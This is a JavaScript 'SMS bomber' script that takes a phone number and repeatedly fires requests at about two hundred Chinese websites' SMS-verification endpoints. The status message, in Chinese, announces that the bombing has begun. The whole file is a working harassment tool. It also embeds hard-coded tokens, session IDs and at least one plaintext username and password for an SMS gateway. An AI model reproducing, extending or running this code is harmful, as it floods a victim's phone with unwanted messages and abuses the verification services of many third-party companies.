document.getElementById("start").onclick=function(){
	var txt=document.getElementById("num").value;
	sendMsg(txt);
    var t1=	window.setInterval("sendMsg()",3000);
	document.getElementById("pp").innerText="已经开始轰炸，关闭浏览器可停止"
};

function sendMsg(phone) {

var urls = [
'http://promotion.trip.taobao.com/platform/tripp_send_sms_screen.htm?_ksTS=1422022510111_178&callback=jsonp179&subActId=1391&phonenum=' + phone
,'http://ajax.huimaiche.com/Validate.ashx?callback=jQuery111006553893235977739_1422024246249&mobile=' + phone + '&callback=%24.validator.remoting.jsonpcb&_=1422024246251'
,'http://passport.iqiyi.com/apis/phone/send_cellphone_authcode.action?requestType=7&serviceId=2&cellphoneNumber=' + phone + '&authcookie=60aeHCYe3b6gem3m3m3Bm1lGpdI3axyepRjOeeiAUZQ9Ppft0m4cf&callback=window.Q.__callbacks__.cbt3d8gt'
,'http://usercenter.12308.com/verifyCode/sendCode.sc?mobilePhone=' + phone
,'http://login.youku.com/user/smscode?mobile=' + phone + '&tcode=mqlogin'
,'http://qiche.tieyou.com/index.php?param=/ajax/sendBusActivityPushAppSms&mobile=' + phone + '&ref=ctrip&jsoncallback=jsonp1421821319281'
,'http://cpvip.ule.com/usr/getMobileValidateCode.do?jsonpCallback=jsonp1419507393210&_=1419507405579&userMobile=' + phone
,'http://smsspub.mail.163.com/mobileserv/fsms.do?callback=_tmp_jsonp_callback1419408928602&product=AndroidMail&template=ds23&mobile=' + phone
,'http://qq.jd.com/new/mobileCode.action?username=' + phone + '&r=0.06689655710943043'
,'http://paimai.taobao.com/pmp/json/sendMobileCode.htm?method=send&mobilePhone=' + phone + '&_tb_token_=hgS5rSdzN4K1tk2&_ksTS=1417944920144_368&callback=jsonp369'
,'http://www.ganxike.com/ajax/APhoneCode.aspx?phone=' + phone
,'http://www.ganxike.com/ajax/APhoneCode.aspx?phone=' + phone
,'http://www.jumei.com/i/account/ajax_send_sms_for_mobile_register?mobile=' + phone
,'http://m.lefeng.com/index.php/user/getMess?mobileId=' + phone
,'http://www.ganxike.com/ajax/VRegister.aspx?UserID=' + phone
,'http://www.ganxike.com/ajax/APhoneCode.aspx?phone=' + phone
,'http://m.babytree.com/reg/get_code?tel=' + phone
,'http://www.baixing.com/m/oz/verify?mobile=' + phone
,'http://m.babytree.com/reg/get_code?tel=' + phone
,'http://www.baixing.com/m/oz/verify?mobile=' + phone
,'http://www.baixing.com/oz/verify?mobile=' + phone
,'http://www.baixing.com/oz/verify?mobile=' + phone
,'http://msgservices.fdc.com.cn/MessageServicesHost.svc/SendMessage?jsoncallback=jQuery16106837893114425242_1412151608406&Phone=' + phone + '&Content=259471&_=1412151636195'
,'http://www.sheyingtg.com/ajax/sms.php?action=getverifycode1&mobile=' + phone + '&r=0.42846162407658994'
,'http://www.vpay8.com/login/uchecksms.aspx?p=' + phone + '&s=d2eb6b0d26b1bd6a95735347ab7bfb9d&t=1&act=mreg&id=20141001172704&rnd=0.9859699094668031'
,'http://passport.iqiyi.com/apis/phone/send_cellphone_authcode.action?requestType=3&cellphoneNumber=' + phone + '&serviceId=2&callback=window.Q.__callbacks__.cbcjmyig'
,'http://m.fang.com/user.d?m=phonelogin&city=heyuan&mstype=regist&burl=&phone=' + phone
,'http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?type=c41&callback=headFloat.MsgFB&tel=' + phone
,'http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?type=c41&callback=headFloat.MsgFB&tel=' + phone
,'http://passport.cngold.com.cn/Handlers/GetMobileValiCode.ashx?callback=jQuery17100520779222715646_1409319889719_=1409805005884&mobile=' + phone
,'http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?type=c41&callback=headFloat.MsgFB&tel=' + phone
,'http://www.cp2y.com/user/sendMobile.htm?_=1409191530888&mobile=' + phone
,'http://www.cp2y.com/user/sendMobile.htm?_=1409191530888&mobile=' + phone
,'http://www.cp2y.com/user/sendMobile.htm?_=1409191531841&mobile=' + phone
,'http://passport.china.com/bindMobile.do?processID=sendMobileCheckCode&smk=c5e766fa-08d5-40c7-b274-de809c3e24ce&mobile=' + phone
,'http://user.kdnet.net/check_phone.asp?_=1409191535123&ajax=y&resendtel=' + phone
,'http://passport.fang.com/get_math_code.aspx?code=5730&codefor=' + phone
,'http://passport.baidu.com/v2/?regphonecheck&apiver=v3&isexchangeable=1&callback=bd__cbs__za1wka&phone=' + phone
,'http://dynamic.aq.xunlei.com/interface/sms?m=set_send&jsoncallback=jsonp1407852186356&mobile=' + phone
,'http://www.yikuaiqu.com/interface/accounts/sendphonebinding.php?v=0.127273319201143&phone=' + phone
,'http://www.houxue.com/pa/reg.php?act=data&flag=getRegVerifyCode&_=1409191540420&x_Cellphone=' + phone
,'http://m.passport.sohu.com/r/sendMVcodeaa?mobile=' + phone
,'http://bbs.360che.com/alone_ajax.php?action=ds21&inajax=1&ajaxtarget=ts&mobilenum=' + phone
,'http://www.500.com/wap/ajax.php?act=md&jsonpcallback=jsonp1409191545883&tel=' + phone
,'http://passport.mgyun.com/Register/SendVerifyCode?num=0.844612127898478&type=register&phone=' + phone
,'http://www.lsgw.com/RegmobileC.aspx?un=60BF1B0B020079AD5E4A0F935CD61F24&phone=' + phone
,'http://www.500.com/wap/ajax.php?act=md&jsonpcallback=jsonp1409191548900&tel=' + phone
,'http://m.ymeae.com/register/step2.php?pin=0_0_1380285261_8392248e36a8414cd6b3e45cc6a9c090&v=6&message=&username=dddfgfg&mobile=' + phone
,'http://vip.360che.com/Content/dealerClause/SendCaptcha.aspx?id=0.161853639136194&LinkmanCall=' + phone
,'http://shenzhen.lashou.com/ajax/signmobile.php?act=send_code&bind_mobile=' + phone
,'http://www.dianping.com/ajax/json/account/reg/mobile/send?callback=DP._JSONPRequest._2&m=' + phone
,'http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&r=0.719746434441789&txtLoginName=' + phone
,'http://highso.cn/customerRegister/obtainMobileAuthCode.do?again=0&random=0.4625208523981323&mobile=' + phone
,'http://m.jiayuan.com/ajax/get_reg_code.php?pin=0_0_1409191489645_b53399e813fe4a7f476d0d8e6e9250a7&v=6&t_code=1409191489645&mobile=' + phone
,'http://highso.cn/customerRegister/obtainMobileAuthCode.do?again=0&random=0.4992307333257983&mobile=' + phone
,'http://passport.zhubao.com/Register/send_sms?mobile=' + phone
,'http://account.beva.com/newAccount/registerSmsCode?mobile=' + phone
,'http://www.xtion.net/api/Register/GetValidateCodes/?MobileOrEmail=' + phone + '&_=1402554928130'
,'http://www.fxiaoke.com/WebReg/GetInviteEmployeeInfo?mobileOrEMail=' + phone + '&_=1402554977169'
,'http://wq.jx163.com/login_new_code/regis/getSMSValidCode1UL.action?ver=0.8235203230313742&cmd.terminalCode=' + phone
,'http://account.beva.com/newAccount/registerSmsCode?mobile=' + phone
,'http://g.10086.cn/eguc/register/smsVerificationCodeAjax?tel=' + phone
,'http://my.tv189.com/site/sendMessageCode?_=1399442866473&mobile=' + phone
,'http://passport.kongzhong.com/ajax/sendsmscode/reg/' + phone + '?t=0.8064816420604055'
,'http://r.meadjohnson.com.cn/api_verifycodet.aspx?phone=' + phone + '&id=0.6346626054287636'
,'http://union.ijinshan.com/index.php?a=send_valid_sms&phone=' + phone
,'http://www.aapinche.cn/account/mobile.aspx?do=getcode&Mobile=' + phone
,'http://www.callingme.com.cn/sendMessageWithPhone?phone=' + phone + '&flag=1&timestamp=1400051009495'
,'http://www.duomi.com/users-getcaptcha?mobile=' + phone + '&intent=0&_=1400051021935'
,'http://www.ganji.com/ajax.php?phone=' + phone + '&module=send_phone_auth_code_vip'
,'http://www.pyt365.net/Account/GetVerification?number=' + phone + '&recomid='
,'http://www.souche.com/pages/sendMessageAction/sendMessage.json?phoneNumber=' + phone
,'http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=' + phone
,'http://reg.zhixiaoren.com/sms/?mobile=' + phone
,'http://www.ganji.com/ajax.php?phone=' + phone + '&amp;module=send_phone_auth_code_vip'
,'http://i.360.cn/smsApi/sendsmscode?account=' + phone + '&amp;condition=2&amp;r=0.2291404186565223&amp;callback=QiUserJsonP1404186565970'
,'http://t.sdo.com/home/SendSms?mobile=' + phone + '&amp;t=0.3571404186565344'
,'http://www.taomingshi.com/index.php?r=login/sendCode&amp;phone=' + phone
,'http://www.iyoukahui.com/member/sendcode/mobile:' + phone
,'http://www.joybtc.com/zh-cn/user/send_sms.php?a=reg&amp;p=' + phone + '&amp;t=0.1802131057167214'
,'http://my.3533.com/mobilereg/sendsms/?mobile=' + phone + '&amp;callback=jsonp_334311404359535393'
,'http://jxhd.xy189.cn/account/register!sendSecurityCode.action?userNumber=' + phone + '&amp;type=0'
,'http://sso.letv.com/user/mobileRegCode/mobile/' + phone + '/mobilecodeletvid/'
,'http://my.m.taobao.com/ajax/sendSms.do?flag=3&amp;phone=' + phone + '&amp;tokenKey=&amp;_ksTS=1404359536427_49&amp;callback=jsonp50'
,'http://bbs.coolpad.com/coolyun/CoolRegisterGetAuthCode.php?cyno=' + phone
,'http://www.jumei.com/i/account/ajax_send_sms_for_mobile_register?mobile=' + phone
,'http://wuhan.baixing.com/oz/mobileCode/?mobile=' + phone
,'http://wuhan.baixing.com/oz/verify/x/reg?mobile=' + phone
,'http://www.to8to.com/my/get_moblie_yz.php?moblie=' + phone
,'http://www.myzhongjin.com/Member/SendMobileCodeOfRegister?rn=0.4688350945374146&amp;mobile=' + phone
,'http://shenzhen.baixing.com/oz/verify/x/reg?mobile=' + phone
,'http://woa.bianfeng.com/woa/autologin/receiveVerificationSms.shtm?phone=' + phone + '&amp;msg=TGOSLb6eac944c63140d1b707e6dabaeae411-1-204292500-1&amp;clientVersion=2.3.1&amp;endpointOS=ios'
,'http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=110%201168869508&amp;mobile=' + phone
,'http://my.tv.sohu.com/user/reg/sendms.do?passport=' + phone
,'http://www.lecai.com/user/ajax_register_phone_authcode_send.php?phone=' + phone
,'http://my.zto.cn/Account/GetPhoneCheckCode?mobile=' + phone
,'http://gwpassport2.woniu.com/v2/sendsms_h9fp972k?jsoncallback=jQuery17204924182975073772_1407727355434&mobile=' + phone + '&_=1407727355613'
,'http://passport.cngold.org/account/mobileCode.htm?callback=jsonp1407729986476&member.mobile=' + phone
,'http://www.ebadu.net/xm_ljs.asp?ids=' + phone + '&yy=0'
,'https://feixin.10086.cn/account/RegisterCodeDiv?mobileno=' + phone
,'http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?tel=' + phone + '&type=C27&detailId=-1&callback=Floating.MsgRp&rd=0.2406133026815951'
,'http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?tel=' + phone + '&type=C27&detailId=-1&callback=Floating.MsgRp&rd=0.2406133026815951'
,'https://www.yypt.com/finance/regist!sendValidateCode.do?mobile=' + phone
,'http://member.88.com.cn/user/getmobilecode.html/?ac=send&mobile=' + phone
,'http://ac.ppdai.com/validatecode?callback=jQuery17108819785887872924_1407124610768&ValidateType=Mobile&MobilePhone=' + phone + '&_=1407124716359'
,'https://www.firstp2p.com/user/MCode/?type=1&isrsms=0&t=1407124856875&mobile=' + phone
,'http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=' + phone + '&_action=checkMoblie'
,'http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=' + phone + '&_action=sendValidationCode'
,'http://www.epicc.com.cn/ecar/proposal/checkmobile/?addCheckValuesFlag=&areaCode=11000000&mobile=' + phone + '&citySelect=11000000&proSelectedtext=%E5%8C%97%E4%BA%AC&citySelectedtext=%E5%8C%97%E4%BA%AC&cooperator=&next=0.3737380872480571'
,'http://www.epicc.com.cn/ecar/followup/callBack/saveCustomerToHF?time=1407125058704/?CallBack.mobile=' + phone + '&CallBack.customerCName=%E6%9D%8E&CallBack.priority=0&CallBack.areaCode=11000000&IsblackFlag=0&addCheckValuesFlag=0&ccaFlag=0&cityCode=11000000&proposalFinished=false&next=0.37693149223923683'
,'http://www.guahao.com/validcode/json/mobile/' + phone + '/REG_MOBILE/ec526aca3bdf5a81dd8d96ad521134da?_=1403700491564'
,'http://www.guahao.com/validcode/json/mobile/' + phone + '/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545'
,'http://www.guahao.com/user/json/existloginid/' + phone + '?_=1403700491106'
,'http://m.ctrip.com/html5/ClientData/SendVerifyCode/' + phone
,'http://m.ctrip.com/html5/Account/UserRegister/?UID=' + phone + '&Password=0e831a33923e4725ee279f645ffb717ae4d011f9a19e1c4252027741156d135f6c58737223feab36bac4e3a1a434c52a3b7395d01e5f68ca81a6e0c8215601c1fe5b1eaa53db6fb23f3cc09338438a50a25c9e3f50a02574df233c8a313c634c9c50aaa88f1b6d2ef679aa3a53638d8ac9fa46354d16927e253f7c44970fa3e2&Sales=&SourceId='
,'http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?r=0.3434412432940654&popType=&LoginName=' + phone
,'http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?popType=0&r=0.8167970664799213&LoginName=' + phone
,'http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=' + phone
,'http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=' + phone
,'http://w.sohu.com/t2/tologin.do?mnd=' + phone + '&qr=1'
,'http://passport.sohu.com/regist/send_sms/?mobile=' + phone
,'http://my.tv.sohu.com/user/reg/getmstatus.do?passport=' + phone
,'http://m.passport.sohu.com/r/sendMVcodeaa?mobile=' + phone
,'http://www.kuaiyoujia.com/Register/GetVerificationCodeOnRegist/?mobile=' + phone
,'http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=' + phone + '&isCheckCode=1'
,'http://u.tieyou.com/api/user.html?act=checkMobileAccount&mobile=' + phone
,'http://u.tieyou.com/api/user.html/?act=checkMobileAccount&action=u.user&mobile=' + phone
,'http://m.passport.sohu.com/r/mobile?mobile=' + phone + '&password=asdfghjkiu&agree=true'
,'http://m.passport.sohu.com/r/mobile?mobile=' + phone + '&password=asdfghjkiu&agree=true'
,'http://www.ximalaya.com/passport/mobile/getVerifyCode/?msgType=4&phone_num=' + phone
,'http://3g.500.com/api/sendcode?mobilenum=' + phone
,'https://passport.bankcomm.com/ajax.php/?a=sendvcode&uname=' + phone + '&regbinding=0'
,'https://passport.m.jd.com/user/getCode.json?&mobile=' + phone + '&sid=5c27553bd5524170c515edd6ffba88fa'
,'https://passport.m.jd.com/user/getCode.action?mobile=' + phone + '&sid=5c27553bd5524170c515edd6ffba88fa'
,'http://zhoukou.baixing.com/oz/verify/x/reg?mobile=' + phone
,'http://zhoukou.baixing.com/oz/voice/?mobile=' + phone
,'http://zhoukou.baixing.com/c/ic/voiceCode'
,'http://zhengzhou.baixing.com/oz/verify/x/reg?mobile=' + phone
,'http://zhengzhou.baixing.com/oz/voice/?mobile=' + phone
,'http://login.tudou.com/passport/sendSmsMsg.do?jsoncallback=jQuery17209491650222335011_1407073475324&type=0&mobile=' + phone + '&_=1407073499462'
,'http://3g.51job.com/my/register.php/?phone=' + phone + '&submit=1&verify_param=7a8654f998c7608fb56e80e0f8a44ad3'
,'http://3g.51job.com/my/register.php?topage=3&verify_param=74eaa3ff5a1ede46f2d98d8b393be1f3&phone=' + phone + '&submit=1&time=1407074694'
,'http://218.200.227.123/order/cmnet/goto_validate_code/?msisdn=' + phone
,'http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=' + phone
,'http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=' + phone
,'http://m.51job.com//ajax/in/getphonecode.ajax.php?phone=' + phone + '&type=5'
,'http://my.51job.com/AjaxAction/mobile_code/send_mobile_code.php/?mobile=' + phone + '&apptype=4'
,'http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=' + phone + '&r=0.41990769281983376'
,'https://register.shengpay.com/personal/sendRegisterSms.htm/?mobile=' + phone
,'http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=' + phone + '&r=0.0194694004021585'
,'https://user.95516.com/uc-cdhd-web/rest/reg/sendmobilecaptcha/?mobile=' + phone + '&msgType=01'
,'http://data.zgzcw.com/newzgzcw/sendMessage.jsp?mobile=' + phone + '&callback=jQuery171007485370174981654_1407076493305&_=1407076509842'
,'http://www.500.com/wap/ajax.php?tel=' + phone + '&act=md&jsonpcallback=jsonp1407076681822'
,'http://www.zsye.com/applyServlet/?userid=637810&opretype=2&sourceName=GW&isHOME=try.jsp&phone=' + phone + '&isphone=' + phone + '&babyBirthday=20140102'
,'http://zg51.net/web/register_up.asp/?mobile=' + phone + '&password=qweasda&tj_custid=0&verify=e33fe4723f457dee'
,'http://pim.10086.cn/ajax/mt.php/? crumb=a9a9d88835a09adbeada414c9fa44b4d&mobile=' + phone + '&channel='
,'https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/? date=1407077678283&account=' + phone
,'http://cbc.iuoooo.com/Register/GetAuthCode/? LoginCode=' + phone
,'http://www.lecai.com/user/ajax_register_phone_authcode_send.php?phone=' + phone
,'http://hwid1.vmall.com:8080/oauth2/oauth2/ajaxHandler_in/getMobileValiCode?mobile=008613281116967&smsReqType=4&session_code_key=p_reg_phone_session_ramdom_code_key&reqClientType=26&pageToken=xdwMu5EeUPC7xkKLdHWcsdSFxZg8TxYC&lang=zh&reflushCode=0.9925481270270826'
,'http://passport.115.com/?ct=ajax&ac=ajax_register_validate&reg[mobile]=' + phone + '&_=1407482013965'
,'http://passport.115.com/?ct=ajax&ac=ajax_smscode&_token=1c3bcfwLc1rPQtERvs4h5Ejb1klfGnFca8T0FGY5BvexelJ2opj4ZxzsWAeTvQyI8VmdNziXlGSA&m=' + phone
,'http://passport.115.com/?ct=ajax&ac=ajax_chekuser&account=113281116967&type=mobile&val=' + phone + '&_=1407482070487'
,'http://i.360.cn/smsApi/sendsmscode?account=' + phone + '&condition=2&r=0.9476780155673623&callback=QiUserJsonP1407482642243'
,'http://id.ourgame.com/passport!exist.do?passport=' + phone + '&_=1407483677524'
,'http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=' + phone
,'http://weburs.ku.163.com/quickReg/sendMobileCaptcha?promark=31j8lmq9&id=null&output=json&m_username=' + phone + '&callback=jQuery16405770837608724833_1407483725809&_=1407483776680'
,'http://weburs.ku.163.com/quickReg/sendMobileCaptcha?promark=ab47ge1s&id=null&output=json&m_username=' + phone + '&callback=jQuery16409621100642252713_1407483945550&_=1407483959565'
,'http://gwpassport2.woniu.com/v2/sendsms_h9fp972k?jsoncallback=jQuery17209502564975991845_1407483940698&mobile=' + phone + '&_=1407484002669'
,'http://cn.ae.aliexpress.com/wsuser/join/SmsSenderAjax.htm/?mobileNo=' + phone + '&_csrf_token_=m6bptqecyqv0&t=1407484167337'
,'https://aq.99.com/AjaxAction/AC_register.ashx/?action=verifyusernameofmobile&txtUserNameOfMobile=' + phone
,'https://aq.99.com/AjaxAction/AC_register.ashx?url=http://www.99.com/?action=createcodeofmobileregister&txtUserNameOfMobile=' + phone
,'http://reg.ztgame.com/registe/sendMobileCode/?check=&phoneNum=' + phone
,'http://www.169money.com/AjaxWeb/GetCode.ashx?0.4810091208200902/?Tel=' + phone
,'http://www.169money.com/AjaxWeb/AddBmFailure.ashx?0.36719161039218307/?UserName=&UserTel=' + phone + '&UserPwd=dj1818&Code=&Card=&Grade=1&Default=&PageName=%25u4EA4%25u6613%25u8F6F%25u4EF629&Operation=%25u514D%25u8D39%25u4E0B%25u8F7D&Typaes=129'
,'http://lxbjs.baidu.com/float/_c.js?vtel=' + phone + '&siteid=4882386&bdcbid=e63c8936-55d6-4d23-9046-d28550cf2f5d&code=E0F7B4FACD65AA17859DBBEA70811673ED3E72AAF845B28CE932C0B27C93E9D6672119895F9A72806F03512459789F986A08049390A06C3B494320DA607CFCE70C8CC66A82FBE41C21242BBCC526AD52A18DEFF09E8AF158E37BBF0CE925562D&t=1407485335002&callback=_lxb_jsonp_hyl8ff16_'
,'http://new.i139.cn/umswx/xyyx/sendAndSmsCode.do?phonenum=' + phone + '&xf=json'
,'http://www.36936.com/handler/RegUserSendSms.ashx?&type=1&mobile=' + phone
,'https://security.9666.cn/register/sendPhoneCodeAjax.action?phone=' + phone
,'http://shenzhen.lashou.com/ajax/signmobile.php?act=send_code&bind_mobile=' + phone
,'http://shenzhen.lashou.com/ajax/signmobile.php?act=checkmobile&mobile=' + phone
,'http://www.quxinwang.com/Codes/Register.aspx?&_=1407633645592&tag=getcode&un=' + phone
,'http://www.jumei.com/i/account/ajax_send_sms_for_mobile_register?mobile=' + phone
,'http://member.88.com.cn/user/getmobilecode.html/?ac=send&mobile=' + phone
,'http://ac.ppdai.com/validatecode?callback=jQuery17108819785887872924_1407124610768&ValidateType=Mobile&MobilePhone=' + phone + '&_=1407124716359'
,'https://www.firstp2p.com/user/MCode/?type=1&isrsms=0&t=1407124856875&mobile=' + phone
,'http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=' + phone + '&_action=checkMoblie'
,'http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=' + phone + '&_action=sendValidationCode'
,'http://www.epicc.com.cn/ecar/proposal/checkmobile/?addCheckValuesFlag=&areaCode=11000000&mobile=' + phone + '&citySelect=11000000&proSelectedtext=%E5%8C%97%E4%BA%AC&citySelectedtext=%E5%8C%97%E4%BA%AC&cooperator=&next=0.3737380872480571'
,'http://www.epicc.com.cn/ecar/followup/callBack/saveCustomerToHF?time=1407125058704/?CallBack.mobile=' + phone + '&CallBack.customerCName=%E6%9D%8E&CallBack.priority=0&CallBack.areaCode=11000000&IsblackFlag=0&addCheckValuesFlag=0&ccaFlag=0&cityCode=11000000&proposalFinished=false&next=0.37693149223923683'
,'https://passport.m.jd.com/user/getCode.action?mobile=' + phone + '&sid=182328dc09ecd4eee908708e0bfd5496'
,'https://passport.jd.com/emReg/sendMobileCode?mobile=' + phone + '&r=0.9010949897739119'
,'https://passport.jd.com/emReg/isMobileEngaged?mobile=' + phone + '&r=0.08241349037594953'
,'http://www.guahao.com/validcode/json/mobile/' + phone + '/REG_MOBILE/ec526aca3bdf5a81dd8d96ad521134da?_=1403700491564'
,'http://www.guahao.com/validcode/json/mobile/' + phone + '/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545'
,'http://www.guahao.com/user/json/existloginid/' + phone + '?_=1403700491106'
,'http://m.ctrip.com/html5/ClientData/SendVerifyCode/' + phone
,'http://m.ctrip.com/html5/Account/UserRegister/?UID=' + phone + '&Password=0e831a33923e4725ee279f645ffb717ae4d011f9a19e1c4252027741156d135f6c58737223feab36bac4e3a1a434c52a3b7395d01e5f68ca81a6e0c8215601c1fe5b1eaa53db6fb23f3cc09338438a50a25c9e3f50a02574df233c8a313c634c9c50aaa88f1b6d2ef679aa3a53638d8ac9fa46354d16927e253f7c44970fa3e2&Sales=&SourceId='
,'http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?r=0.3434412432940654&popType=&LoginName=' + phone
,'http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?popType=0&r=0.8167970664799213&LoginName=' + phone
,'http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=' + phone
,'http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=' + phone
,'http://w.sohu.com/t2/tologin.do?mnd=' + phone + '&qr=1'
,'http://passport.sohu.com/regist/send_sms/?mobile=' + phone
,'http://my.tv.sohu.com/user/reg/getmstatus.do?passport=' + phone
,'http://m.passport.sohu.com/r/sendMVcodeaa?mobile=' + phone
,'http://www.kuaiyoujia.com/Register/GetVerificationCodeOnRegist/?mobile=' + phone
,'http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=' + phone + '&isCheckCode=1'
,'http://u.tieyou.com/api/user.html?act=checkMobileAccount&mobile=' + phone
,'http://u.tieyou.com/api/user.html/?act=checkMobileAccount&action=u.user&mobile=' + phone
,'http://m.passport.sohu.com/r/mobile?mobile=' + phone + '&password=asdfghjkiu&agree=true'
,'http://m.passport.sohu.com/r/mobile?mobile=' + phone + '&password=asdfghjkiu&agree=true'
,'http://sso.letv.com/user/mobileRegCode/mobile/=' + phone + '/mobilecodeletvid/'
,'http://sso.letv.com/user/mobileRegCode/mobile/' + phone + '/mobilecodeletvid/k961601363512388'
,'http://sso.letv.com/user/mobileRegCode/mobile/' + phone + '/mobilecodeletvid/f219111395819034'
,'http://sso.letv.com/user/mobileRegCode/mobile/' + phone + '/mobilecodeletvid/c326961366927138'
,'http://sso.letv.com/user/mobileRegCode/mobile/' + phone + '/mobilecodeletvid/'
,'http://sso.letv.com/user/checkMobileExists/mobile/' + phone + '?jsonp=jQuery17103937588292174041_1405268556755&_=1405268598815'
,'http://sso.letv.com/user/checkMobileExists/mobile/' + phone + '?jsonp=jQuery17103937588292174041_1405268556754&_=1405268579859'
,'http://sso.letv.com/user/checkMobileExists/mobile/' + phone + '?jsonp=jQuery171008569038612768054_1402390605865&_=1402390613618'
,'http://218.28.199.137/m/mobile/registerSms/?mobile=' + phone
,'http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=' + phone
,'http://211.152.60.227:8029/Api/index.php/Member/registerValidateCode/?phone=' + phone
,'http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=' + phone
,'http://180.168.178.213:8888/MemberMag.asmx/SendVeCode?sob_password=d5299c2fe78d75a37b0d3f4715d678bb&sob_code=79388bb8a33bbe3d403d7e76d6d12d24&sob_hotelgroup_id=8d5e957f297893487bd98fa830fa6413&phoneNum=' + phone + '&act=0'
,'http://114.112.174.170/serviceCor/regfirst.action?mobile=' + phone
,'http://111.1.37.36:8686/link_smssend.asp?username=wzysba&password=wzysba&mobile=' + phone + '&content=%C4%FA%B5%C4%D7%A2%B2%E1%D1%E9%D6%A4%C2%EB%CA%C7%3A476948&sendtime='
,'http://www.ximalaya.com/passport/mobile/getVerifyCode/?msgType=4&phone_num=' + phone
,'http://3g.500.com/api/sendcode?mobilenum=' + phone
,'https://passport.bankcomm.com/ajax.php/?a=sendvcode&uname=' + phone + '&regbinding=0'
,'https://passport.m.jd.com/user/getCode.json?&mobile=' + phone + '&sid=5c27553bd5524170c515edd6ffba88fa'
,'https://passport.m.jd.com/user/getCode.action?mobile=' + phone + '&sid=5c27553bd5524170c515edd6ffba88fa'
,'http://zhoukou.baixing.com/oz/verify/x/reg?mobile=' + phone
,'http://zhoukou.baixing.com/oz/voice/?mobile=' + phone
,'http://zhengzhou.baixing.com/oz/verify/x/reg?mobile=' + phone
,'http://zhengzhou.baixing.com/oz/voice/?mobile=' + phone
,'http://login.tudou.com/passport/sendSmsMsg.do?jsoncallback=jQuery17209491650222335011_1407073475324&type=0&mobile=' + phone + '&_=1407073499462'
,'http://3g.51job.com/my/register.php/?phone=' + phone + '&submit=1&verify_param=7a8654f998c7608fb56e80e0f8a44ad3'
,'http://3g.51job.com/my/register.php?topage=3&verify_param=74eaa3ff5a1ede46f2d98d8b393be1f3&phone=' + phone + '&submit=1&time=1407074694'
,'http://218.200.227.123/order/cmnet/goto_validate_code/?msisdn=' + phone
,'http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=' + phone
,'http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=' + phone
,'http://m.51job.com//ajax/in/getphonecode.ajax.php?phone=' + phone + '&type=5'
,'http://my.51job.com/AjaxAction/mobile_code/send_mobile_code.php/?mobile=' + phone + '&apptype=4'
,'http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=' + phone + '&r=0.41990769281983376'
,'https://register.shengpay.com/personal/sendRegisterSms.htm/?mobile=' + phone
,'http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=' + phone + '&r=0.0194694004021585'
,'https://user.95516.com/uc-cdhd-web/rest/reg/sendmobilecaptcha/?mobile=' + phone + '&msgType=01'
,'http://data.zgzcw.com/newzgzcw/sendMessage.jsp?mobile=' + phone + '&callback=jQuery171007485370174981654_1407076493305&_=1407076509842'
,'http://www.500.com/wap/ajax.php?tel=' + phone + '&act=md&jsonpcallback=jsonp1407076681822'
,'http://www.zsye.com/applyServlet/?userid=637810&opretype=2&sourceName=GW&isHOME=try.jsp&phone=' + phone + '&isphone=' + phone + '&babyBirthday=20140102'
,'http://zg51.net/web/register_up.asp/?mobile=' + phone + '&password=qweasda&tj_custid=0&verify=e33fe4723f457dee'
,'http://mnote.weibo.10086.cn/AppServer/api/getDyncPasswd.do/?{"username":"' + phone + '"}'
,'http://pim.10086.cn/ajax/mt.php/? crumb=a9a9d88835a09adbeada414c9fa44b4d&mobile=' + phone + '&channel='
,'https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/?date=1407077678283&account=' + phone
];

for(var i in urls) {
	new Image().src = urls[i];
}

}

